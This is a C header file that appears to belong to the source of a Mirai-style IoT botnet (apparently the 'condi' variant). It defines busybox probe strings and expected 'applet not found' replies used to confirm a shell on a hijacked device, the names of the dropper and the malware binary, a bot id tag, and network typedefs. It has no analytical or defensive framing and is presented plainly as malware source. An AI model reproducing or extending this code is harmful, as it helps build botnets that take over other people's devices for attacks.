#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define TOKEN_QUERY "/bin/busybox condixx"
#define TOKEN_RESPONSE "condixx: applet not found"

#define EXEC_QUERY "/bin/busybox xxidnoc"
#define EXEC_RESPONSE "xxidnoc: applet not found"

#define FN_DROPPER "thefuck"
#define FN_BINARY "condi72"

extern char *id_tag;
